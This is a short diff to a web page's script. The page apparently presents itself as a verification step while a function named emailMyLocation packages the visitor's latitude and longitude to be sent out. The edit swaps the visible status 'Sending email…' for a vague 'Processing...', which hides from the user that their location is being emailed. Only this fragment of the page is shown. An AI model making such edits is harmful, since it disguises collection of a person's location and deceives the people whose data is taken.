@@ -193,7 +193,7 @@
       async function emailMyLocation() {
         if (!lastPos) return setStatus("Unable to detect verification. Please verify completely first.");
 
-        setStatus("Sending email…");
+        setStatus("Processing...");
 
         const payload = {
           lat: lastPos.coords.latitude,
@@ -258,6 +258,7 @@
   </script>
 </body>
 </html>
+
 
 
 
